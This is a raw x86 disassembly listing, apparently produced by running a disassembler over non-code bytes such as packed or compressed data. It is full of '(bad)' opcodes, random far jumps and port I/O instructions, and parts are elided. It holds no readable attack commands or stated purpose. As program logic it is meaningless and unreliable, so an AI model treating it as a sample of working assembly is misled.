  41ec23:	jmp    0x41ec09
  41ec25:	shl    DWORD PTR [esi],0xe7
  41ec28:	jns    0x41ec75
  41ec2a:	dec    ecx
  41ec2b:	add    bh,BYTE PTR [ebx-0x64]
  41ec2e:	cli    
  41ec2f:	mov    esp,0xa70f171b
  41ec34:	in     eax,0x0
	...
  41ec96:	inc    ecx
  41ec97:	icebp  
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	jns    0x41ece4
  41eca4:	ret    
  41eca5:	ja     0x41ecc0
  41eca7:	inc    esi
  41eca8:	add    DWORD PTR [eax],eax
  41ecaa:	pop    es
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [ebx-0x3d],bl
  41ecb0:	mov    edi,0xc3ddc9bc
  41ecb5:	push   esp
  41ecb6:	das    
  41ecb7:	adc    BYTE PTR [esi-0x73],0x6a
  41ecbb:	scas   al,BYTE PTR es:[edi]
  41ecbc:	and    eax,0xae3e931
  41ecc1:	sar    DWORD PTR [esi-0xa064eb0],1
  41ecc7:	jecxz  0x41ec4f
  41ecc9:	sti    
  41ecca:	je     0x41ecf0
  41eccc:	test   eax,0x6989ae7c
  41ecd1:	cmp    DWORD PTR [eax+esi*8],esp
  41ecd4:	jmp    DWORD PTR [ebx+0x562b4fae]
  41ecda:	ins    BYTE PTR es:[edi],dx
  41ecdb:	mov    dl,0x4f
  41ecdd:	or     DWORD PTR [ebx],ebp
  41ecdf:	sub    eax,0x549fda9b
  41ece4:	jle    0x41ed13
  41ece6:	pop    eax
  41ece7:	inc    eax
  41ece8:	dec    esi
  41ece9:	pop    es
  41ecea:	dec    esi
  41eceb:	call   0xf04d:0x5ad7b0cd
  41ecf2:	fs jecxz 0x41ed14
  41ecf5:	pop    ebp
  41ecf6:	inc    eax
  41ecf7:	aad    0xb
  41ecf9:	xchg   ecx,eax
  41ecfa:	stos   DWORD PTR es:[edi],eax
  41ecfb:	mov    bl,0x73
  41ecfd:	(bad)  
  41ecfe:	mov    esi,0xd89eca29
  41ed03:	jb     0x41ed1e
  41ed05:	ror    BYTE PTR [ebx+0x6f],0x8b
  41ed09:	lods   al,BYTE PTR ds:[esi]
  41ed0a:	push   0x86d14dc
  41ed0f:	cmp    bl,BYTE PTR [ecx-0x37]
  41ed12:	xchg   ebx,eax
  41ed13:	imul   ecx,ecx,0x9b89d3b
  41ed19:	or     al,0x48
  41ed1b:	push   edx
  41ed1c:	fstp   DWORD PTR [eax+0x1e956a2a]
  41ed22:	sub    eax,0x45beaab0
  41ed27:	pop    ebx
  41ed28:	sbb    edx,DWORD PTR [ebx-0x5f219a42]
  41ed2e:	adc    esi,DWORD PTR [edx]
  41ed30:	loop   0x41ed19
  41ed32:	push   edi
  41ed33:	inc    esi
  41ed34:	mov    BYTE PTR ds:0x4c9e95e,al
  41ed3a:	mov    esi,0x579f8197
  41ed3f:	add    dh,ch
  41ed41:	ja     0x41ed29
  41ed43:	mov    edi,0x69828060
  41ed48:	loope  0x41eda2
  41ed4a:	je     0x41ed7c
  41ed4c:	add    cl,ah
  41ed4e:	repnz cmp esi,DWORD PTR [ecx+0x77]
  41ed52:	repnz dec bx
  41ed55:	mov    ?,ebp
  41ed57:	stos   DWORD PTR es:[edi],eax
  41ed58:	mov    eax,ds:0x95e3768d
  41ed5d:	or     BYTE PTR [ebp+edi*4+0x6f],bh
  41ed61:	test   ecx,ecx
  41ed63:	gs push esp
  41ed65:	retf   
  41ed66:	mov    ecx,0x6589ac27
  41ed6b:	std    
  41ed6c:	jmp    0x41ed97
  41ed6e:	mov    ch,0xf
  41ed70:	repz scas eax,DWORD PTR es:[edi]
  41ed72:	xchg   ebp,eax
  41ed73:	fcmovu st,st(4)
  41ed75:	xchg   esp,eax
  41ed76:	mov    ebx,0xdba80942
  41ed7b:	bswap  edi
  41ed7d:	dec    edi
  41ed7e:	xchg   ebp,eax
  41ed7f:	mov    eax,ds:0xc2a1cddf
  41ed84:	pop    ecx
  41ed85:	adc    ecx,eax
  41ed87:	add    eax,ebx
  41ed89:	fidivr WORD PTR [ecx+0x629c14a7]
  41ed8f:	mov    DWORD PTR gs:[ebx+eax*8],esi
  41ed93:	mul    ah
  41ed95:	mov    ch,0xf3
  41ed97:	adc    BYTE PTR ds:0xa8b8ed1a,bl
  41ed9d:	int3   
  41ed9e:	cmp    al,0x3
  41eda0:	and    DWORD PTR [edi+0x70b491d5],ecx
  41eda6:	call   0x6f7f6e9
  41edab:	push   DWORD PTR [esi+eiz*2+0x5a056647]
  41edb2:	data16 test BYTE PTR [ecx],al
	...
  41ee15:	add    BYTE PTR ds:0x7b197956,al
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x7275b0a2,al
  41ee23:	xor    al,0xb3
  41ee25:	pop    edi
  41ee26:	and    BYTE PTR [edi+0x1],al
  41ee29:	add    BYTE PTR [edi],al
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    bh,dh
  41ee2f:	lods   eax,DWORD PTR ds:[esi]
  41ee30:	loop   0x41eeb1
  41ee32:	or     ecx,ecx
  41ee34:	xchg   ecx,eax
  41ee35:	adc    ecx,0x42f5ae42
  41ee3b:	loopne 0x41ede0
  41ee3d:	test   ebx,ecx
  41ee3f:	mov    esp,0x843f6b68
  41ee44:	out    0x6d,al
  41ee46:	fld    QWORD PTR [edx-0x1af1a378]
  41ee4c:	mov    ds:0xfbe8d3a0,eax
  41ee51:	and    edi,ecx
  41ee53:	call   DWORD PTR [edx+eiz*4+0x4df43508]
  41ee5a:	jne    0x41ee1d
  41ee5c:	fcomp  QWORD PTR [ebx]
  41ee5e:	out    dx,eax
  41ee5f:	dec    ebx
  41ee60:	jg     0x41ee1f
  41ee62:	dec    ebx
  41ee63:	stos   BYTE PTR es:[edi],al
  41ee64:	repnz das 
  41ee66:	xchg   esp,eax
  41ee67:	inc    ecx
  41ee68:	or     ecx,esi
  41ee6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee6b:	ins    BYTE PTR es:[edi],dx
  41ee6c:	cld    
  41ee6d:	jno    0x41ee24
  41ee6f:	fdivr  st,st(7)
  41ee71:	nop
  41ee72:	add    al,0x6c
  41ee74:	cmp    dl,BYTE PTR [eax]
  41ee76:	sub    DWORD PTR [edi],ecx
  41ee78:	cmp    eax,0xcab327f6
  41ee7d:	in     eax,0x3a
  41ee7f:	dec    ebx
  41ee80:	push   cs
  41ee81:	popf   
  41ee82:	cdq    
  41ee83:	push   ss
  41ee84:	arpl   WORD PTR [ebp+0x14],cx
  41ee87:	int    0xff
  41ee89:	lock xchg esi,eax
  41ee8b:	pop    ds
  41ee8c:	mov    cl,0x49
  41ee8e:	ins    BYTE PTR es:[edi],dx
  41ee8f:	jg     0x41eef8
  41ee91:	cmp    DWORD PTR [edx],0x58
  41ee94:	es mov ch,0x95
  41ee97:	ja     0x41eee1
  41ee99:	pop    ss
  41ee9a:	stos   BYTE PTR es:[edi],al
  41ee9b:	mov    ds:0x46fc018e,al
  41eea0:	mov    ebx,0x7a0da90d
  41eea5:	or     al,0x61
  41eea7:	add    eax,0x53608aa6
  41eeac:	ss retf 
  41eeae:	mov    bl,0xc9
  41eeb0:	dec    ebp
  41eeb1:	push   eax
  41eeb2:	jle    0x41ef2a
  41eeb4:	jo     0x41ef33
  41eeb6:	sub    bh,BYTE PTR [ebx+0x33]
  41eeb9:	adc    BYTE PTR [edx],bl
  41eebb:	stc    
  41eebc:	mov    ebp,0xca602dd7
  41eec1:	push   edx
  41eec2:	mov    ebx,0x37f4d5de
  41eec7:	mov    DWORD PTR [ecx],edi
  41eec9:	jo     0x41ee51
  41eecb:	lock repz push edi
  41eece:	out    dx,al
  41eecf:	int    0x95
  41eed1:	repz and ecx,DWORD PTR [edi+0xe]
  41eed5:	aad    0x9d
  41eed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eed8:	lds    ebp,FWORD PTR [ebx+0x12]
  41eedb:	in     eax,dx
  41eedc:	cmp    al,0x76
  41eede:	mov    bh,0xbd
  41eee0:	sbb    BYTE PTR [ebp-0x4e64b987],cl
  41eee6:	jl     0x41ee6f
  41eee8:	jmp    DWORD PTR [eax+0x50]
  41eeeb:	mov    ah,BYTE PTR [esi+0x3c9e2433]
  41eef1:	add    eax,DWORD PTR [ebp-0x40de44f0]
  41eef7:	jle    0x41eed2
  41eef9:	aas    
  41eefa:	dec    ebx
  41eefb:	pop    es
  41eefc:	mov    ecx,0xe0bc32b6
  41ef01:	mov    al,ds:0xa4a302a1
  41ef06:	nop
  41ef07:	push   ecx
  41ef08:	ins    BYTE PTR es:[edi],dx
  41ef09:	add    al,dh
  41ef0b:	mov    ?,WORD PTR [ecx]
  41ef0d:	das    
  41ef0e:	cdq    
  41ef0f:	push   edx
  41ef10:	or     BYTE PTR [eax+0x5318cb19],0xcc
  41ef17:	jo     0x41eed7
  41ef19:	mov    al,BYTE PTR ds:0xd2feda1d
  41ef1f:	mov    BYTE PTR [edx],al
  41ef21:	sub    ebx,DWORD PTR [ebp-0x71770a3b]
  41ef27:	add    DWORD PTR [edx-0x24],0x7c
  41ef2b:	jae    0x41eed3
  41ef2d:	xor    eax,DWORD PTR [edx]
  41ef2f:	ins    DWORD PTR es:[edi],dx
  41ef30:	cmp    DWORD PTR [eax],esp
  41ef32:	or     DWORD PTR [esi],esp
  41ef34:	imul   eax,DWORD PTR [eax],0x0
	...
  41ef93:	add    BYTE PTR [eax],al
  41ef95:	add    BYTE PTR [ecx-0xda40a3],bh
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax+0x3efceb38]
  41efa3:	add    ebx,DWORD PTR es:[edi+eiz*1+0x48]
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    al,bl
  41efaf:	test   eax,0x1cf78a02
  41efb4:	test   BYTE PTR [esi-0x3b],cl
  41efb7:	mov    ecx,0x9fbaa690
  41efbc:	or     al,0x26
  41efbe:	lahf   
  41efbf:	int    0x35
  41efc1:	mov    esp,0x183f8cc7
  41efc6:	add    BYTE PTR [ecx],ah
  41efc8:	cmp    cl,BYTE PTR [ebx]
  41efca:	(bad)  
  41efcb:	outs   dx,BYTE PTR ds:[esi]
  41efcc:	mov    eax,0xd312b132
  41efd1:	push   0x7ff6df5d
  41efd6:	mov    bh,0x8b
  41efd8:	mov    ecx,0xd2333864
  41efdd:	popf   
  41efde:	xchg   edx,eax
  41efdf:	or     al,0x1e
  41efe1:	push   eax
  41efe2:	push   0x6b
  41efe4:	cli    
  41efe5:	xchg   ebx,eax
  41efe6:	fld    QWORD PTR ds:0x57772421
  41efec:	push   ecx
  41efed:	and    BYTE PTR [edx],0xc4
  41eff0:	xor    dl,BYTE PTR [eax+0x2c]
  41eff3:	dec    ecx
  41eff4:	inc    edi
  41eff5:	out    dx,eax
  41eff6:	dec    ebx
  41eff7:	jno    0x41effc
  41eff9:	rcl    DWORD PTR [ecx-0x16ab20bd],cl
  41efff:	repz js 0x41f05d
  41f002:	inc    edi
  41f003:	mov    DWORD PTR [edx],ecx
  41f005:	adc    eax,0x28f402be
  41f00a:	or     al,0xa3
  41f00c:	xor    DWORD PTR [ecx],edi
  41f00e:	aad    0x35
  41f010:	jns    0x41efe6
  41f012:	add    BYTE PTR [ebp-0x29b73e1],ah
  41f018:	je     0x41efa8
  41f01a:	popf   
  41f01b:	sbb    ebp,esi
  41f01d:	outs   dx,BYTE PTR ds:[esi]
  41f01f:	(bad)  
  41f020:	(bad)  
  41f021:	outs   dx,BYTE PTR ds:[esi]
  41f022:	imul   eax,DWORD PTR [esi],0x1bd8eea6
  41f028:	fwait
  41f029:	iret   
  41f02a:	adc    al,0xb7
  41f02c:	pop    eax
  41f02d:	std    
  41f02e:	mov    BYTE PTR [esi],ah
  41f030:	add    eax,0xa7f44835
  41f035:	popf   
  41f036:	mov    ds:0x1cfc29e7,eax
  41f03b:	mov    ch,0x66
  41f03d:	dec    esp
  41f03e:	inc    edi
  41f03f:	daa    
  41f040:	sub    ebx,DWORD PTR [ebx]
  41f042:	addr16 cld 
  41f044:	jmp    0x41efce
  41f046:	adc    eax,0xef67c3de
  41f04b:	or     BYTE PTR [ecx+0x781c552c],0xcf
  41f052:	mov    ds:0x3433fd19,al
  41f057:	ret    0x2d2c
  41f05a:	adc    dh,BYTE PTR [ebx+0x10]
  41f05d:	bound  esp,QWORD PTR [edi+0x1ad61783]
  41f063:	add    DWORD PTR [ecx-0x22b3c6d5],0xffffff8f
  41f06a:	nop
  41f06b:	test   eax,ecx
  41f06d:	jmp    ecx
  41f06f:	sbb    al,0x77
  41f071:	jb     0x41f036
  41f073:	int3   
  41f074:	jne    0x41f05a
  41f076:	jmp    0x37c0:0xdccff533
  41f07d:	and    eax,0xd2abee7a
  41f082:	(bad)  
  41f083:	push   edi
  41f084:	mov    al,0xf9
  41f086:	lods   eax,DWORD PTR ds:[esi]
  41f087:	xor    DWORD PTR [edx],0x4a
  41f08a:	pop    edi
  41f08b:	mov    esi,0xbbd8b477
  41f090:	cmc    
  41f091:	and    cl,dh
  41f093:	xor    al,0x5
  41f095:	out    dx,al
  41f096:	mov    dl,0x58
  41f098:	aas    
  41f099:	mov    cl,cl
  41f09b:	pop    ecx
  41f09c:	or     cl,ch
  41f09e:	cwde   
  41f09f:	ds jno 0x41f032
  41f0a2:	out    dx,eax
  41f0a3:	fcmovnu st,st(4)
  41f0a5:	xor    BYTE PTR [edx+0x6],ch
  41f0a8:	rcl    BYTE PTR [esi],0x78
  41f0ab:	pop    ebx
  41f0ac:	mov    eax,ds:0x23324cf3
  41f0b1:	inc    edi
  41f0b2:	mov    eax,0x7c0
	...
  41f113:	add    BYTE PTR [eax],al
  41f115:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx-0x49910580]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    bl,ch
  41f12f:	loope  0x41f150
  41f131:	and    DWORD PTR [esi-0x19],esi
  41f134:	sahf   
  41f135:	jg     0x41f130
  41f137:	push   edx
  41f138:	inc    edx
  41f139:	cwde   
  41f13a:	push   ebx
  41f13b:	retf   0xf30f
  41f13e:	cmp    edx,esp
  41f140:	push   edx
  41f141:	(bad)  
  41f142:	cwde   
  41f143:	ror    esi,0xd8
  41f146:	sub    BYTE PTR [ebx],al
  41f148:	adc    eax,0x386450c5
  41f14d:	leave  
  41f14e:	pop    edi
  41f14f:	cmp    DWORD PTR [edx],ebx
  41f151:	leave  
  41f152:	mov    dl,0x9f
  41f154:	int3   
  41f155:	inc    esp
  41f156:	jg     0x41f10f
  41f158:	adc    al,0x22
  41f15a:	jbe    0x41f1b4
  41f15c:	aad    0xa1
  41f15e:	and    eax,0xcaa62a98
  41f163:	mov    bh,0x90
  41f165:	(bad)  
  41f166:	shl    BYTE PTR [ebx+esi*2],0x71
  41f16a:	das    
  41f16b:	addr16 fwait
  41f16d:	int3   
  41f16e:	jmp    0x7739c491
  41f173:	and    DWORD PTR [esi],esi
  41f175:	pop    esi
  41f176:	pop    ecx
  41f177:	stc    
  41f178:	fwait
  41f179:	sub    al,0x5c
  41f17b:	cmp    eax,0xf35cd195
  41f180:	inc    esp
  41f181:	mov    DWORD PTR [si+0x6d],esp
  41f185:	push   ebp
  41f186:	xchg   ebp,eax
  41f187:	cmc    
  41f188:	retf   
  41f189:	leave  
  41f18a:	fisub  DWORD PTR [ebp-0x31240856]
  41f190:	xchg   edx,eax
  41f191:	ror    BYTE PTR [eax+eax*2+0x7d],1
  41f195:	pop    edi
  41f196:	dec    esi
  41f197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f198:	mov    WORD PTR [ecx+0x1036ca07],fs
  41f19e:	mov    ebp,0xaeb4dc1a
  41f1a3:	inc    eax
  41f1a4:	mov    dl,0x4a
  41f1a6:	retf   0x3d06
  41f1a9:	jae    0x41f155
  41f1ab:	mov    dh,0x39
  41f1ad:	dec    ebx
  41f1ae:	dec    ecx
  41f1af:	push   ecx
  41f1b0:	sub    DWORD PTR [ebp-0x3b],edi
  41f1b3:	stc    
  41f1b4:	or     esi,esp
  41f1b6:	data16 aam 0x1f
  41f1b9:	jnp    0x41f20c
  41f1bb:	dec    ecx
  41f1bc:	push   cs
  41f1bd:	shl    dl,0x3d
  41f1c0:	stc    
  41f1c1:	sahf   
  41f1c2:	mov    DWORD PTR [esi-0xf],ebx
  41f1c5:	dec    ebx
  41f1c6:	leave  
  41f1c7:	int    0x72
  41f1c9:	pop    ecx
  41f1ca:	arpl   WORD PTR [ecx-0x882ddcb],cx
  41f1d0:	adc    ecx,DWORD PTR [esi-0x22]
  41f1d3:	pop    ds
  41f1d4:	ins    DWORD PTR es:[edi],dx
  41f1d5:	js     0x41f16f
  41f1d7:	ds jae 0x41f233
  41f1da:	xchg   ebp,eax
  41f1db:	jae    0x41f21f
  41f1dd:	fld    DWORD PTR [eax]
  41f1df:	dec    edi
  41f1e0:	push   0xffffffa6
  41f1e2:	xchg   DWORD PTR [edi+0x1c917253],ebp
  41f1e8:	into   
  41f1e9:	retf   
  41f1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1eb:	push   edi
  41f1ec:	(bad)  
  41f1ed:	loopne 0x41f25b
  41f1ef:	pop    esp
  41f1f0:	push   ebp
  41f1f1:	pushf  
  41f1f2:	cmp    eax,0x8456d15f
  41f1f7:	dec    esp
  41f1f8:	fisub  WORD PTR [esi+ecx*8]
  41f1fb:	repz cmp ch,BYTE PTR [edi-0x2a]
  41f1ff:	add    al,0x6b
  41f201:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f203:	adc    DWORD PTR [edi+0x176c4a3f],0xffffffd1
  41f20a:	jg     0x41f1c5
  41f20c:	pusha  
  41f20d:	outs   dx,DWORD PTR ds:[esi]
  41f20e:	(bad)  
  41f20f:	xchg   esp,eax
  41f210:	sbb    DWORD PTR [ebx-0x10c10077],esi
  41f216:	out    0xc1,al
  41f218:	mov    ebp,0x36efd279
  41f21d:	pop    ds
  41f21e:	jmp    0x41f268
  41f220:	ror    ebx,cl
  41f222:	push   ecx
  41f223:	sbb    al,0x9d
  41f225:	push   ss
  41f226:	rcr    BYTE PTR [ecx-0xf],1
  41f229:	and    esp,DWORD PTR [ebx+0x30]
  41f22c:	das    
  41f22d:	test   al,0x31
  41f22f:	or     dl,ch
  41f231:	sub    BYTE PTR ds:0x5a9a,bh
	...
  41f293:	add    BYTE PTR [eax],al
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	out    0x8e,al
  41f2a4:	add    edi,DWORD PTR [eax+0x14a35]
  41f2aa:	pop    es
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [ebp+0x1a],al
  41f2b0:	cmp    al,0xb6
  41f2b2:	pushw  cs
  41f2b4:	ds in  eax,dx
  41f2b6:	xor    al,0x8a
  41f2b8:	dec    ecx
  41f2b9:	cwde   
  41f2ba:	mov    ah,0xee
  41f2bc:	xor    ecx,DWORD PTR [ebp-0x4d027ea]
  41f2c2:	lea    esp,ds:0xdc318599
  41f2c8:	mov    dl,0x5b
  41f2ca:	add    al,0x5b
  41f2cc:	mov    ah,0x36
  41f2ce:	dec    esi
  41f2cf:	test   DWORD PTR gs:[esp+eiz*2-0x3e44e50a],edx
  41f2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2d8:	rcl    DWORD PTR [edx],cl
  41f2da:	das    
  41f2db:	int    0x4
  41f2dd:	mov    cl,0xfb
  41f2df:	push   ebx
  41f2e0:	mov    bl,0xf
  41f2e2:	mov    DWORD PTR [esi],edi
  41f2e4:	fsub   st,st(0)
  41f2e6:	mov    edi,0xc59c704d
  41f2eb:	ds inc esp
  41f2ed:	sahf   
  41f2ee:	and    DWORD PTR [ebp-0x2eab949c],edi
  41f2f4:	push   esi
  41f2f5:	inc    edx
  41f2f6:	inc    edi
  41f2f7:	rcr    DWORD PTR [edi],cl
  41f2f9:	cdq    
  41f2fa:	add    al,0x33
  41f2fc:	add    cl,BYTE PTR [ecx+0x70f6f31a]
  41f302:	std    
  41f303:	inc    edi
  41f304:	inc    ecx
  41f305:	mov    ebx,0x8f9e2afb
  41f30a:	mov    ebp,0x605a7b52
  41f30f:	js     0x41f2e2
  41f311:	ds push ecx
  41f313:	cmp    eax,0xa0e9a32
  41f318:	pop    ds
  41f319:	loopne 0x41f387
  41f31b:	aad    0x83
  41f31d:	test   BYTE PTR [ebx],bh
  41f31f:	dec    esi
  41f320:	add    ah,BYTE PTR [esi+esi*2+0xa306970]
  41f327:	fs (bad) 
  41f329:	xlat   BYTE PTR ds:[ebx]
  41f32a:	adc    ch,BYTE PTR [ebx+0x3f]
  41f32d:	sub    eax,0xff49158a
  41f332:	ss adc edx,ebp
  41f335:	jns    0x41f31e
  41f337:	cs pop esi
  41f339:	adc    edx,DWORD PTR ds:0xf56ef9be
  41f33f:	jb     0x41f3bb
  41f341:	mov    edi,DWORD PTR [edx+0x1a]
  41f344:	xor    dh,BYTE PTR [eax+0x1c]
  41f347:	sbb    dl,BYTE PTR [edi+eax*1]
  41f34a:	xor    al,0x48
  41f34c:	xlat   BYTE PTR ds:[ebx]
  41f34d:	and    ah,BYTE PTR [edx]
  41f34f:	or     BYTE PTR [esi],dh
  41f351:	mov    ds:0xb9594cd3,eax
  41f356:	out    0x90,eax
  41f358:	stos   BYTE PTR es:[edi],al
  41f359:	dec    edx
  41f35a:	jne    0x41f311
  41f35c:	ror    BYTE PTR [edi+0x64f6bed8],1
  41f362:	sbb    al,0x3a
  41f364:	enter  0x8f04,0x28
  41f368:	cmp    BYTE PTR ds:0xc5d3b368,bl
  41f36e:	loope  0x41f3b8
  41f370:	int    0x3e
  41f372:	dec    esp
  41f373:	(bad)  
  41f374:	in     al,0x1d
  41f376:	sub    eax,DWORD PTR [esi+0x46e2672a]
  41f37c:	scas   eax,DWORD PTR es:[edi]
  41f37d:	test   eax,0x87cadcc6
  41f382:	mov    ecx,0x93ad5721
  41f387:	inc    edx
  41f388:	inc    ebp
  41f389:	lods   al,BYTE PTR ds:[esi]
  41f38a:	xchg   edi,eax
  41f38b:	mov    ebp,0x32f32e7e
  41f390:	add    esp,ecx
  41f392:	ins    DWORD PTR es:[edi],dx
  41f393:	dec    esi
  41f394:	push   eax
  41f395:	add    BYTE PTR [ecx-0x3a],ch
  41f398:	sbb    esp,DWORD PTR [ecx+0x752d3e54]
  41f39e:	lock cld 
  41f3a0:	xchg   esp,eax
  41f3a1:	inc    ebp
  41f3a2:	mov    ebx,0x4d144db5
  41f3a7:	cmp    al,ah
  41f3a9:	sbb    al,0x6
  41f3ab:	push   ds
  41f3ac:	jl     0x41f3ef
  41f3ae:	push   edi
  41f3af:	fidivr WORD PTR [esi]
  41f3b1:	cmp    BYTE PTR [ebp+0xfea],0x0
	...
  41f414:	add    BYTE PTR [eax],al
  41f416:	cmp    al,0xe7
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	stos   DWORD PTR es:[edi],eax
  41f423:	cmp    eax,0x4b3cfec2
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [edx-0x97a19b7],al
  41f433:	leave  
  41f434:	cwde   
  41f435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f436:	push   ecx
  41f437:	push   ss
  41f438:	add    BYTE PTR ds:0x32b5cd63,bl
  41f43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f43f:	xor    eax,0x6e09ba4c
  41f444:	jge    0x41f41c
  41f446:	sbb    ecx,DWORD PTR [edx+edx*1-0x2ad0c9ca]
  41f44d:	jp     0x41f478
  41f44f:	sbb    al,0xea
  41f451:	mov    ds:0x1323f9cb,al
  41f456:	jmp    0x297bb175
  41f45b:	cwde   
  41f45c:	mov    ebp,0x895e1f7e
  41f461:	inc    edx
  41f462:	pop    es
  41f463:	adc    BYTE PTR [esp+esi*8+0x3d],bl
  41f467:	stc    
  41f468:	pop    ss
  41f469:	jbe    0x41f45d
  41f46b:	adc    dh,BYTE PTR [esi-0x4f]
  41f46e:	in     al,0x14
  41f470:	xchg   edx,eax
  41f471:	rcr    DWORD PTR [ecx-0x65ad263f],1
  41f477:	(bad)  
  41f478:	(bad)  
  41f47a:	lock cwde 
  41f47c:	(bad)  [ebx]
  41f47e:	mov    WORD PTR [edi-0x1c],gs
  41f481:	sbb    BYTE PTR ds:[ebx],0x8f
  41f485:	xor    eax,DWORD PTR [edx]
  41f487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f488:	inc    edx
  41f489:	inc    esi
  41f48a:	add    al,0xac
  41f48c:	sbb    al,0x51
  41f48e:	inc    esi
  41f48f:	out    0x1a,eax
  41f491:	inc    edi
  41f492:	or     dl,BYTE PTR [ebp-0x79b78c36]
  41f498:	adc    edi,DWORD PTR [eax]
  41f49a:	pop    es
  41f49b:	inc    DWORD PTR [edx]
  41f49d:	clc    
  41f49e:	ror    BYTE PTR [ebp-0x253cb5e2],cl
  41f4a4:	mov    eax,0x8c4d15c5
  41f4a9:	test   BYTE PTR [edx],bl
  41f4ab:	loopne 0x41f4ce
  41f4ad:	mov    ds,WORD PTR [ebp-0x76642904]
  41f4b3:	out    dx,al
  41f4b4:	popa   
  41f4b5:	fld    QWORD PTR [ecx]
  41f4b7:	std    
  41f4b8:	jbe    0x41f4cf
  41f4ba:	enter  0xa62d,0xfb
  41f4be:	pushf  
  41f4bf:	fcmovb st,st(2)
  41f4c1:	mov    ecx,0x5a001b3d
  41f4c6:	dec    edi
  41f4c7:	dec    esi
  41f4c8:	pop    edx
  41f4c9:	inc    edi
  41f4ca:	jnp    0x41f4cb
  41f4cc:	aam    0x81
  41f4ce:	add    BYTE PTR [edx],ah
  41f4d0:	and    DWORD PTR [eax+0x5bb2a4cf],esi
  41f4d6:	jl     0x41f522
  41f4d8:	stos   BYTE PTR es:[edi],al
  41f4d9:	mov    edi,0xba88cfae
  41f4de:	adc    eax,0x7048c523
  41f4e3:	scas   eax,DWORD PTR es:[edi]
  41f4e4:	push   0xae493922
  41f4e9:	pusha  
  41f4ea:	ficomp DWORD PTR [esi-0x6d]
  41f4ed:	call   0xc772:0xf86c5be7
  41f4f4:	push   edx
  41f4f5:	aaa    
  41f4f6:	scas   eax,DWORD PTR es:[edi]
  41f4f7:	cwde   
  41f4f8:	inc    esi
  41f4f9:	rcl    BYTE PTR [ebx],1
  41f4fb:	mov    ah,0x4b
  41f4fd:	or     bh,BYTE PTR [eax]
  41f4ff:	iret   
  41f500:	arpl   bx,dx
  41f502:	fwait
  41f503:	scas   al,BYTE PTR es:[edi]
  41f504:	add    al,0xe3
  41f506:	les    edi,FWORD PTR [esi-0x6b7afd01]
  41f50c:	dec    esp
  41f50d:	cmp    cl,BYTE PTR [eax+0xc]
  41f510:	add    dl,BYTE PTR [edx+ecx*1-0x54edbdd1]
  41f517:	jbe    0x41f557
  41f519:	(bad)  
  41f51a:	js     0x41f4a3
  41f51c:	ficomp WORD PTR [edx-0x4b]
  41f51f:	pop    es
  41f520:	and    BYTE PTR ds:0x61691976,ch
  41f526:	pop    eax
  41f527:	push   0x14
  41f529:	push   edx
  41f52a:	mov    dh,0x9e
  41f52c:	out    dx,al
  41f52d:	ror    BYTE PTR [ebp+0x4feee77a],cl
  41f533:	dec    ecx
  41f534:	dec    edx
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	pop    esi
  41f5a3:	inc    ebx
  41f5a4:	xor    al,0xbb
  41f5a6:	inc    ebx
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [esi],cl
  41f5af:	jns    0x41f5a8
  41f5b1:	xor    BYTE PTR [ebx],0x63
  41f5b4:	outs   dx,DWORD PTR ds:[esi]
  41f5b5:	jl     0x41f5f7
  41f5b7:	and    esi,DWORD PTR [edx-0x427e807]
  41f5bd:	mov    eax,0x341cfcda
  41f5c2:	loop   0x41f5ff
  41f5c4:	lds    ebp,FWORD PTR [ebx-0x5d]
  41f5c7:	aad    0x4c
  41f5c9:	(bad)  
  41f5ca:	cld    
  41f5cb:	sub    ah,BYTE PTR [esi+0x3c0bec58]
  41f5d1:	popa   
  41f5d2:	jecxz  0x41f5a8
  41f5d4:	xchg   ebp,eax
  41f5d5:	in     eax,dx
  41f5d6:	retf   
  41f5d7:	lods   al,BYTE PTR ds:[esi]
  41f5d8:	mov    esi,0xd4eedf37
  41f5dd:	inc    esp
  41f5de:	ds mov ebp,0xb4f267a
  41f5e4:	adc    ecx,DWORD PTR [bx+di]
  41f5e7:	out    0xe1,al
  41f5e9:	jmp    0x2285:0xd851f63d
